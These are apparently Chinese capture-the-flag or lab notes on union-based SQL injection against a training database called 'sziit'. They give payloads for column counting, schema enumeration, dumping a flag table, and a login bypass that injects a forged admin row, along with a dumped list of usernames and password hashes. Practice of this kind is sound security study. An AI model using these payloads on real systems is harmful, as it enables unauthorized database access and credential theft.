SQL 注入

1、猜测列数

 ``` 
  order by 2 --+'
 ```

2、联合查询

2.1 查询数据库名

```
 ' union select 1,database() from information_schema.tables --+'
```

2.1 查询表名

```
unon select group_concat(table_name),database()  from information_schema.tables where table_schema='sziit' --+'
```

Flag,emails,emails,referers,uagents,users

2.2 查询列名

```
' union select group_concat(column_name),2  from information_schema.columns where table_name='Flag' --+'
```

flag

2.3 获取目标

```
' union select group_concat(flag),2  from sziit.Flag --+'
```

flag{sziit_easy}





Dumb:bdc9b127f96d62a37b4425d6d3b100e8642586f5,

Angelina:58011b56a915cb05bd7e6b24b78ac9ecb8a2145f,

Dummy:36e618512a68721f032470bb0891adef3362cfa9,

secure:e6c9c06c4a28eae6d75bf7283481d256ab2626b4,

stupid:a17b85f1edab9ecfea2b05da9267c5714c1665e0,

superman:53d5137e0bc2123e5d2cbdb3e89895c2c84eb75f,

batman:b8671c54326cdbe4d4d67f68f3d247775872a7a0,





```sql
username=admin'union(select(1),('admin'),('356a192b7913b04c54574d18c28d46e6395428ab'))--+'&password=1&submit=submit
```

